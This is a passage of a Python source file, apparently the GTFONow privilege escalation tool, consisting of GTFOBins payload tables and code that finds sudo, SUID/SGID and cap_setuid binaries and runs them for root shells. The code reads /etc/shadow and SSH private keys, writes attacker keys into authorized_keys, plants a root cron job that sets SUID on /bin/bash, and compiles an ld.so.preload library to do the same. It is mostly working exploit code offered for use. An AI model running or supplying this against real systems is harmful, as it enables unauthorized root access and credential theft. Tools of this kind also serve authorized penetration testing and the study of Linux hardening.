        "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
    ],
    "xargs": [
        "./xargs -a /dev/null sh -p"
    ],
    "xdotool": [
        "./xdotool exec --sync /bin/sh -p"
    ],
    "xmodmap": [
        "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
    ],
    "xmore": [
        "LFILE=file_to_read\n./xmore $LFILE\n"
    ],
    "xxd": [
        "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
    ],
    "xz": [
        "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
    ],
    "yash": [
        "./yash"
    ],
    "zsh": [
        "./zsh"
    ],
    "zsoelim": [
        "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
    ]
}
# SUID_BINS_END

# CAPABILITIES_START
capabilities={
    "gdb": [
        "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
    ],
    "node": [
        "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
    ],
    "perl": [
        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
    ],
    "php": [
        "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
    ],
    "python": [
        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    ],
    "ruby": [
        "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
    ],
    "rview": [
        "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "rvim": [
        "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "view": [
        "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "vim": [
        "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ],
    "vimdiff": [
        "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    ]
}
# CAPABILITIES_END

SUDO_NO_PASSWD = "Sudo NOPASSWD"
SUID_SGID = "SUID/SGID Binary"
try:
    input = raw_input
except NameError:
    pass

RED = '\033[31m'
GREEN = '\033[32m'
LIGHTGREY = '\033[37m'
RESET = '\033[0m'


class CustomLogger(logging.Logger):
    def __init__(self, name, level=logging.DEBUG):
        super(CustomLogger, self).__init__(name, level)

        self.console_handler = logging.StreamHandler()
        self.console_handler.setLevel(logging.DEBUG)

        formatter = CustomFormatter()
        self.console_handler.setFormatter(formatter)

        self.addHandler(self.console_handler)

    def set_level(self, level):
        self.setLevel(level)
        self.console_handler.setLevel(level)


class CustomFormatter(logging.Formatter):
    def format(self, record):
        if record.levelno == logging.INFO:
            record.msg = LIGHTGREY + "[*] " + RESET + str(record.msg)
        elif record.levelno == logging.ERROR:
            record.msg = RED + "[x] " + RESET + str(record.msg)
        elif record.levelno == logging.WARNING:
            record.msg = GREEN + "[!] " + RESET + str(record.msg)
        return super(CustomFormatter, self).format(record)


logging.setLoggerClass(CustomLogger)

log = logging.getLogger(__name__)
log.set_level(logging.INFO)


def execute_command(command):
    """
    Executes a given command using subprocess and returns the output.
    Compatible with Python 2.* and 3.*.

    :param command: Command to execute as a string or list.
    :return: A tuple containing the standard output and standard error.
    """
    try:
        if isinstance(command, list):
            command = " ".join(command)

        log.debug("Executing %s", command)

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        output, error = process.communicate()

        if sys.version_info[0] == 3:
            output = output.decode('utf-8') if output else output
            error = error.decode('utf-8') if error else error

        if output:
            log.debug("Output: %s", output)
        if error:
            log.error("Error: %s", error)
        return output, error

    except OSError as e:
        return None, "OS error occurred: " + str(e)


def arbitrary_file_read(binary, payload, user="root", command=None):
    """Exploit arbitrary file read vulnerability.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    if is_service_running("ssh"):
        ssh_key_privesc(payload, user)
    log.info("Performing arbitrary file read with %s", binary)
    print("Enter the file that you wish to read. (eg: /etc/shadow)")
    file_to_read = input("> ")
    payload = payload.replace("file_to_read", file_to_read)
    os.system(payload)


def arbitrary_file_write(binary, payload, risk, user="root", command=None):
    """Exploit arbitrary file write.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        user (str): User to exploit.
    """
    log.info("Performing arbitrary file write with %s", binary)
    options = []
    if risk == 2:
        if is_service_running("ssh"):
            options.append(("ssh", "Obtain shell by writing SSH key"))
        if user == "root" and is_service_running("cron"):
            options.append(("cron", "Obtain shell by writing to Cron"))
        options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
        options.append(("arbitrary", "Arbitrary file Write (no shell)"))
        print("\nSelect an exploit option:")
        for idx, (option_code, description) in enumerate(options):
            print(GREEN + "[" + str(idx) + "] " + RESET + description)
        choice = get_user_choice("> ")
        chosen_option = options[choice][0]
        if chosen_option == "ssh":
            ssh_write_privesc(payload, user, command)
        elif chosen_option == "cron":
            cron_priv_esc(payload, command)
        elif chosen_option == "ld_preload":
            ld_preload_exploit(binary, payload, command)
        elif chosen_option == "arbitrary":
            print("Create a file named " + GREEN + "input_file" +
                  RESET + " containing the file content")
            log.info(
                "Spawning temporary shell to create file, type 'exit' when done")
            print(
                "Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
            file_to_write = input("> ")
            payload = payload.replace("file_to_write", file_to_write)
            os.system(payload)
    else:
        print("Create a file named " + GREEN + "input_file" +
              RESET + " containing the file content")
        log.info("Spawning temporary shell to create file, type 'exit' when done")
        print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
        file_to_write = input("> ")
        payload = payload.replace("file_to_write", file_to_write)
        os.system(payload)


def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root", command=None):
    """Exploit a binary.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        binary_path (str, optional): Path to binary.. Defaults to None.
        user (str, optional): User to exploit. Defaults to "root".
    """

    if exploit_type == SUDO_NO_PASSWD and user != "root":
        payload = payload.replace("sudo", "sudo -u " + user)
    print(payload)
    if binary_path:
        payload = payload.replace("./"+binary, binary_path)
    else:
        payload = payload.replace("./"+binary, binary)
    if "file_to_read" in payload:
        arbitrary_file_read(binary, payload, user, command)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary, payload, risk, user, command)
    else:
        if command:
            execute_privileged_command(payload, command)
        else:
            log.info("Spawning %s shell", user)
            os.system(payload)


def execute_privileged_command(payload, command):
    process = subprocess.Popen(
        payload, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    process.stdin.write(command + '\n')

    out, err = process.communicate()
    if out:
        print('Output:', out)
    if err:
        print('Error:', err)


def get_sudo_l_output():
    """Gets the output of sudo -l command.

    Returns:
        str: Output of sudo -l command.
    """
    try:
        process = subprocess.Popen(
            ['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for _ in range(10):
            time.sleep(0.1)
            if process.poll() is not None:
                break
        else:
            process.kill()
            print("Command timed out. User may need to enter a password.")
            return

        stdout, _ = process.communicate()

        if sys.version_info[0] >= 3:
            stdout = stdout.decode('utf-8')

        return stdout
    except Exception as e:
        print("Error: " + str(e))
        return


def check_sudo_binaries(sudo_l_output):
    """Checks for privilege escalations via binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    all_matches = re.findall(r'\(.*\) (.*)', sudo_l_output)
    for match in all_matches:
        if 'NOPASSWD' not in match:
            binaries = match.split(', ')
            for binary_path in binaries:
                binary = binary_path.split('/')[-1]
                if binary not in sudo_bins.keys():
                    continue

                payloads = sudo_bins.get(binary)
                priv_esc = {
                    "Binary": binary,
                    "Path": binary_path,
                    "Payloads": payloads,
                    "Type": "Sudo (Needs Password)"
                }
            priv_escs.append(priv_esc)

    return priv_escs


def check_sudo_nopasswd_binaries(sudo_l_output):
    """Checks for privilege escalations via NOPASSWD binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    matches = re.findall(r'\(([^)]+)\) NOPASSWD: (.*)', sudo_l_output)
    for user, command_paths in matches:
        if user.lower() == "all":
            user = "root"
        binaries = command_paths.split(', ')
        for binary_path in binaries:
            binary = binary_path.split('/')[-1]
            if binary not in sudo_bins.keys():
                continue

            payloads = sudo_bins.get(binary)
            priv_esc = {
                "SudoUser": user,
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUDO_NO_PASSWD
            }
            priv_escs.append(priv_esc)

    return priv_escs


def is_linux():
    """
    Check if the host operating system is a variant of Linux.

    Returns:
        bool: True if the OS is Linux, False otherwise.
    """
    return platform.system() == "Linux"


def check_suid_bins():
    """
    Checks if any binaries in PATH are suid or sgid binaries and referenced in GTFOBins.

    Returns:
        list: A list of potential privilege escalations.
    """
    potential_privesc = []
    for binary, payloads in suid_bins.items():
        binary_path = get_binary_path(binary)
        if not binary_path:
            continue

        file_properties = check_suid_sgid(binary_path)
        is_suid = file_properties.get("SUID")
        is_sgid = file_properties.get("SGID")

        if is_suid or is_sgid:
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            potential_privesc.append(priv_esc)
            log.warning("Found exploitable %s binary: %s", "suid" if is_suid else "sgid",
                        binary_path)

    return potential_privesc


def check_capability(binary_path, capability):
    """
    Check if the given capability (e.g., 'cap_setuid') is set on the binary using the getcap command.

    Args:
    binary_path (str): The full path to the binary.
    capability (str): The capability to check for (e.g., 'cap_setuid').

    Returns:
    bool: True if the capability is set, False otherwise.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return

    try:
        result, error = execute_command(["getcap", binary_path])

        if capability in result:
            return True
        return False

    except subprocess.CalledProcessError as e:
        print("Error: %s", e)
        return False


def is_service_running(service):
    """
    Check if a service is running.

    Returns:
    bool: True if service is running, False otherwise.
    """

    if get_binary_path("service"):
        result, error = execute_command(["service", service, "status"])
        if " is running" in result:
            return True
    if get_binary_path("systemctl"):
        result, error = execute_command(["systemctl", "status", service])
        if "active (running)" in result:
            return True
    return False


def cron_priv_esc(payload, command=None):
    """Turns arbitrary write into shell by writing to cron.

    Args:
        payload (str): Exploit payload.
    """
    CRONTAB_PATHS = ["/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.hourly/",
                     "/etc/cron.monthly/", "/etc/cron.weekly/", "/var/spool/cron/crontabs/"]

    file_to_write = "/var/spool/cron/crontabs/root"
    payload = payload.replace("file_to_write", file_to_write)
    payload = payload.replace("DATA", "* * * * * chmod u+s /bin/bash")
    log.info("Writing payload to crontab %s", file_to_write)
    execute_command(payload)
    log.info("Waiting for cron to execute payload")
    count = 0
    while True:
        if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
            log.info("SUID bit set on /bin/bash, spawning root shell")
            if command:
                execute_privileged_command(payload, command)
            else:
                os.system("/bin/bash -p")
            break
        time.sleep(1)
        count = count + 1
        if count > 65:
            log.error("Cron did not execute payload, something went wrong.")
            break


def ld_preload_exploit(binary, payload, command=None):
    """Turns arbitrary write into shell by writing to /etc/ld.so.preload

    Args:
        Binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    if get_binary_path("gcc") is None:
        log.error("gcc not found in PATH, cannot escalate using LD_PRELOAD")
        return

    lib_src = """
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/bin/bash", 0, 0);
        chmod("/bin/bash", 04755);
        unlink("/etc/ld.so.preload");
        printf("Complete.");
    }
    """

    f = open("/tmp/libpwn.c", "w")
    f.write(lib_src)
    f.close()
    execute_command("gcc -w -shared -o /tmp/libpwn.so /tmp/libpwn.c")

    # f = open("/tmp/libpwn.so", "rb")
    # binary_data = f.read()
    # lib_data = ''.join(f'\\x{byte:02x}' for byte in binary_data)
    # payload_1 = payload.replace("DATA", lib_data)
    # payload_1 = payload_1.replace("file_to_write", "/lib/libgtfo.so")
    # payload_1 = payload_1.replace("echo", "echo -n -e")

    payload = re.sub("data", "/tmp/libpwn.so", payload, flags=re.IGNORECASE)
    payload = payload.replace("file_to_write", "/etc/ld.so.preload")
    execute_command(payload)
    execute_command(binary + " --help >/dev/null 2>&1")

    if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
        log.info("SUID bit set on /bin/bash, spawning root shell")
        if command:
            execute_privileged_command("/bin/bash -p", command)
        else:
            os.system("/bin/bash -p")


def check_cap_bins():
    """Checks if any binaries in PATH are have vulnerable capabilities referenced in GTFOBins."""

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []

    potential_privesc = []
    for binary, payloads in capabilities.items():
        binary_path = get_binary_path(binary)
        if binary_path is None:
            continue
        if check_capability(binary_path, "cap_setuid"):
            log.warning(
                "Found exploitable suid binary: %s", binary)
            priv_esc = {"Binary": binary, "Path": binary_path,
                        "Payloads": payloads, "Type": "Capability", "Capability": "cap_setuid"}
            potential_privesc.append(priv_esc)
    return potential_privesc


# def is_binary_in_gtfobins(binary, gtfo_list):
#     # Check for specific versions of python, not caught by default list
#     pattern = r'^python\d+(\.\d+)?$'
#     if re.match(pattern, binary):
#         binary = "python"
#     return binary in gtfo_list.keys()


def check_cap_full_disk():
    """Checks if any binaries on the filesystem have vulnerable capabilities

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []
    res, err = execute_command("getcap -r / 2>/dev/null")
    potential_privesc = []

    for line in res.splitlines()[:-1]:
        line = line.decode("utf-8")
        parts = line.split(" ")
        caps = parts[-1]
        cap_parts = caps.split(",")
        binary_path = " ".join(parts[:-1])
        for cap in cap_parts:
            if "setuid" in cap:
                binary = binary_path.split("/")[-1]
                if binary in capabilities.keys():
                    priv_esc = {"Binary": binary, "Path": binary_path,
                                "Payloads": capabilities[binary], "Type": "Capability", "Capability": cap}
                    log.warning(
                        "Found cap_setuid binary: %s",  binary_path)
                    potential_privesc.append(priv_esc)
                else:
                    log.info(
                        "cap_setuid binary %s found, but no public exploit in GTFOBins", binary_path)
            else:
                log.info(
                    "Found unexploitable capability %s for %s", cap, binary_path)

    return potential_privesc


def ssh_write_privesc(payload, user="root", command=None):
    """Turns arbitrary write into shell by writing to user's SSH key

    Args:
        payload (str): Exploit payload
        user (str, optional): User to exploit. Defaults to "root".
    """

    if get_binary_path("ssh-keygen") is None:
        log.error("ssh-keygen not found in PATH, cannot escalate using SSH key")
        return

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Attempting to escalate using root's SSH key")

    execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
    with open("/tmp/gtfokey.pub", "r") as f:
        pub_key = f.read()
        pub_key = pub_key.strip()
        payload = payload.replace("DATA", pub_key)
        payload = payload.replace(
            "file_to_write", home_dir+"/.ssh/authorized_keys")

        res, err = execute_command(payload)
        shell_payload = "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost"
        if not err:
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                os.system(shell_payload)


def ssh_key_privesc(payload, user="root", command=None):
    """Turns arbitrary read into shell by reading user's SSH key.

    Args:
        payload (str): Exploit payload.
        user (str, optional): User to exploit. Defaults to "root".
    """

    key_names = ["id_dsa", "id_ed25519", "id_rsa", "id_ecdsa"]

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Attempting to escalate using root's SSH key")

    for key in key_names:
        path = home_dir+"/.ssh/"+key
        exploit_payload = payload.replace("file_to_read", path)
        res, err = execute_command(exploit_payload)
        if not err:
            priv_key = res.strip()
            if "encrypted" in priv_key.lower():
                log.error("Key %s is encrypted, skipping", path)
            log.info("Spawning %s SSH shell using %s", user, path)
            shell_payload = "ssh-agent bash -c \"ssh-add <(echo '" + priv_key + \
                "') && ssh -o \"StrictHostKeyChecking=no\" "+user+"@localhost\""
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                os.system(shell_payload)


def payload_type(payload):
    """Determine payload type.

    Args:
        payload (str): Exploit payload.

    Returns:
        str: Payload type, eg shell, or arbitrary read.
    """
    if "file_to_read" in payload:
        return "Arbitrary read"
    elif "file_to_write" in payload:
        return "Arbitrary write"
    elif "file_to_change" in payload:
        return "File Permission Change"
    elif "sh" in payload:
        return "Shell"
    else:
        return "Unknown"


def get_binary_path(binary_name):
    """
    Find the full path of a binary, similar to the Unix 'which' command.

    Args:
    binary_name (str): The name of the binary to search for.

    Returns:
    str: The full path to the binary if found, otherwise None.
    """
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return None


def check_suid_sgid(file_path):
    """
    Check if the SUID or SGID bit is set on the file at the given path and return the owner and group.

    Args:
        file_path (str): The path to the file.

    Returns:
        dict: A dictionary with the SUID and SGID status, and owner and group of the file.
    """
    try:
        file_stat = os.stat(file_path)
        mode = file_stat.st_mode

        is_suid = bool(mode & stat.S_ISUID)
        is_sgid = bool(mode & stat.S_ISGID)

        owner_id = file_stat.st_uid
        group_id = file_stat.st_gid

        owner_name = pwd.getpwuid(owner_id).pw_name
        group_name = grp.getgrgid(group_id).gr_name

        return {"SUID": is_suid, "SGID": is_sgid, "Owner": owner_name, "Group": group_name}

    except FileNotFoundError:
        return {"Error": "File not found"}


def is_binary_in_path(binary_path):
    """
    Check if the given binary path is in the user's PATH.

    Args:
        binary_path (str): The full path to the binary.

    Returns:
        bool: True if the binary is in the PATH, False otherwise.
    """
    binary_name = os.path.basename(binary_path)

    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return True
    return False


def check_suid_full_disk():
    """Searches files system for vulnerable suid and sguid binaries.

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    res, err = execute_command("find / -perm -4000 -type f 2>/dev/null")
    binary_paths = res.split("\n")[:-1]
    res, err = execute_command("find / -perm -2000 -type f 2>/dev/null")
    sgid_binaries = res.split("\n")[:-1]
    new_binaries = set(binary_paths) - set(sgid_binaries)
    binary_paths.extend(new_binaries)

    potential_privesc = []
    for binary_path in binary_paths:
        if is_binary_in_path(binary_path):
            continue
        binary = binary_path.split("/")[-1]
        if binary in suid_bins.keys():
            file_properties = check_suid_sgid(binary_path)
            is_suid = file_properties.get("SUID")
            is_sgid = file_properties.get("SGID")
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": suid_bins[binary],
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            log.warning(
                "Found exploitable suid binary outside of user's PATH: %s", binary_path)
            potential_privesc.append(priv_esc)
        else:
            log.info(
                "Found suid/sgid binary, however there is no known GTFOBin exploit: %s", binary_path)
    return potential_privesc


def get_user_choice(prompt):
    choice = input("\n"+prompt)
    return int(choice)


def print_banner():
    print(GREEN+r"""
  ___________________  _  __          
 / ___/_  __/ __/ __ \/ |/ /__ _    __
/ (_ / / / / _// /_/ /    / _ \ |/|/ /
\___/ /_/ /_/  \____/_/|_/\___/__,__/ 
                                      
    """+RESET)
    print("https://github.com/Frissi0n/GTFONow\n")


def parse_arguments():
    parser = argparse.ArgumentParser(
        description='GTFONow: Automatic privilege escalation using GTFOBins')
    parser.add_argument('--level', default=1, choices=[1, 2], type=int,
                        help='Level of checks to perform. Default level 1 for a quick scan.')
    parser.add_argument("--risk", default=1, choices=[1, 2],
                        type=int, help="Risk level of exploit to perform. Default risk level 1 for safe operations.")
    parser.add_argument("--sudo_password", action="store_true",
                        help="If you know the sudo password, enable sudo_password mode for more privilege escalation options.")
    parser.add_argument(
        "--command", help="Rather than spawn an interactive shell, issue a single command. Mainly for debugging purposes only.")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output.')
    return parser.parse_args()


def get_sudo_password():
    print("Enter sudo password:")
    return getpass.getpass("> ")


def perform_privilege_escalation_checks(args):
    sudo_privescs, suid_privescs, cap_privescs = [], [], []

    suid_privescs = check_suid_bins()

    if get_binary_path("sudo"):
        if args.sudo_password:
            sudo_password = get_sudo_password()
        sudo_l_output = get_sudo_l_output()
        if sudo_l_output:
            sudo_privescs.extend(check_sudo_binaries(sudo_l_output))
            sudo_privescs.extend(check_sudo_nopasswd_binaries(sudo_l_output))

    if is_linux():
        cap_privescs.extend(check_cap_bins())

    if args.level >= 2:
        suid_privescs.extend(check_suid_full_disk())
        cap_privescs.extend(check_cap_full_disk() if is_linux() else [])

    return sudo_privescs, suid_privescs, cap_privescs


def display_privilege_escalation_options(priv_escs):
    if not priv_escs:
        logging.warning("No privilege escalations found.")
        sys.exit(1)

    print("\nChoose method to GTFO:")
    for key, value in enumerate(priv_escs):
        print_formatted_priv_esc_option(key, value)


def print_formatted_priv_esc_option(key, value):
    info = format_priv_esc_info(value)

    # Initialize payload_options
    payload_options = []

    # Populate payload_options, ensuring no duplicates
    for payload in value["Payloads"]:
        payload_desc = payload_type(payload)
        if payload_desc not in payload_options:
            payload_options.append(payload_desc)

    payload_types = ", ".join(payload_options)

    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'])
    print("  Path: " + value["Path"] + "\n  Type: " +
          value["Type"] + "\n  Info: " + info + "\n  Payloads: " + payload_types)


def format_priv_esc_info(priv_esc):
    """
    Formats the privilege escalation information based on the type.
    """
    info = ""
    priv_type = priv_esc["Type"]

    if priv_type == SUDO_NO_PASSWD and priv_esc.get("SudoUser"):
        user = priv_esc.get("SudoUser")
        formatted_user = RED + user + RESET if user == "root" else GREEN + user + RESET
        info = "Sudo NOPASSWD as user " + formatted_user

    elif priv_type == SUID_SGID:
        owner = priv_esc.get("SUID")
        group = priv_esc.get("SGID")
        if owner:
            formatted_owner = RED + owner + RESET if owner == "root" else GREEN + owner + RESET
            info = "SetUID binary as user " + formatted_owner
        if group:
            if info:
                info += ", "
            info += "SetGID binary as group " + group

    elif priv_type == "Capability":
        capability = priv_esc.get("Capability", "N/A")
        info = "Binary with capability " + capability

    return info


def execute_payload(priv_esc, risk, command=None):
    print("Choose payload:")
    for key, payload in enumerate(priv_esc["Payloads"]):
        print(GREEN + "[" + str(key) + "] " +
              RESET + priv_esc["Binary"] + GREEN + " " + payload_type(payload).lower() + RESET)

    choice = get_user_choice("> ")
    user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
    if user:
        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
                binary_path=priv_esc["Path"], user=user, command=command)
    else:
        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
                binary_path=priv_esc["Path"], command=command)


def main():
    args = parse_arguments()

    if args.verbose:
        log.set_level(logging.DEBUG)

    print_banner()
    sudo_privescs, suid_privescs, cap_privescs = perform_privilege_escalation_checks(
        args)

    priv_escs = sudo_privescs + suid_privescs + cap_privescs
    display_privilege_escalation_options(priv_escs)

    choice = get_user_choice("> ")
    selected_priv_esc = priv_escs[choice]
    execute_payload(selected_priv_esc, args.risk, args.command)


if __name__ == "__main__":
    main()
